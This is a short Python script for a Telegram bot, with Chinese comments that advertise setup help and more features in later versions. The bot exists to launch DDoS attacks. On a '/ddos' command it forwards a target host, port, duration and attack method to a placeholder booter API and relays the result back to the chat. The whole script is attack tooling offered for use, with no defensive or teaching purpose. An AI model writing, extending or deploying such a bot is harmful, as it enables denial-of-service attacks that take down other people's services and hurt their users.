import sys
import time
import requests
import telepot
from telepot.loop import MessageLoop

#Tg: @thisalaska 可以帮忙搭建,有问题可以问.
#这是最基础的功能,如果需要其他功能,可以自己写,东西不难,一小会就可以写好.
#我后续的版本已经很多功能,只开放前期的.其他功能自己去写就可以.
#python搭建,简单方便.
#使用方法 python t.py 你的TOKEN
def handle(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    usertext = msg['text']
    if '/ddos' in usertext:
        text1 = usertext.split()
        temp = requests.get("你的API地址" + text1[1] + "&port=" + text1[2] + "&time=" + text1[3] + "&method=" + text1[4])
        bot.sendMessage(chat_id, temp.text)
        return
TOKEN = sys.argv[1]
bot = telepot.Bot(TOKEN)
MessageLoop(bot, handle).run_as_thread()
print ('Listening ...')
while 1:
    time.sleep(10)